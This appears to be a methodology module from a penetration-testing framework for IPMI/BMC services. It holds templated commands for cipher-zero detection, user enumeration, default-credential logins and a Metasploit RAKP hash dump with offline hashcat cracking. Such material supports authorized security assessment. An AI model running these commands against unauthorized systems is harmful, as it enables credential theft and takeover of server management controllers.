# IPMI / BMC Module

IPMI / baseboard-management-controller methodology (623/udp). BMCs grant
out-of-band control and commonly suffer default creds and protocol flaws.

```yaml
module: ipmi
title: IPMI / BMC
scope: port
matches: [ipmi, asf-rmcp]
summary: "IPMI/BMC service ({prod})."
finding_keywords: [ipmi, bmc, rakp, cipher zero]
unauth_services: [ipmi]
techniques_extra: [T1552]
attack_surface:
  - { when: "always", note: "BMCs often ship with default creds and protocol flaws (cipher-zero, RAKP hash leak) granting full out-of-band control." }
  - { when: "unauth", note: "IPMI 2.0 RAKP allows remote retrieval of password hashes for offline cracking." }
checks:
  - { name: Version, attack: T1592.002, command: "nmap -sU -p{port} --script ipmi-version {ip}", purpose: "Identify the IPMI version and supported cipher suites." }
  - { name: Cipher-zero, attack: T1190, command: "nmap -sU -p{port} --script ipmi-cipher-zero {ip}", purpose: "Detect the cipher-zero authentication bypass (CVE-2013-4660)." }
  - { name: User enumeration, attack: T1087, command: "ipmitool -I lanplus -H {ip} -U <user> -P <pass> user list", purpose: "Enumerate IPMI user accounts and channel privilege levels." }
  - { name: Default creds, attack: T1078.001, command: "ipmitool -I lanplus -H {ip} -U ADMIN -P ADMIN chassis status", purpose: "Test documented BMC default credentials (ADMIN/ADMIN, root/calvin)." }
  - { name: RAKP hash dump, attack: T1110.002, command: "msfconsole -qx 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {ip}; run; exit'", purpose: "Retrieve IPMI 2.0 RAKP password hashes, then crack offline with hashcat -m 7300 (hydra has no IPMI module)." }
```
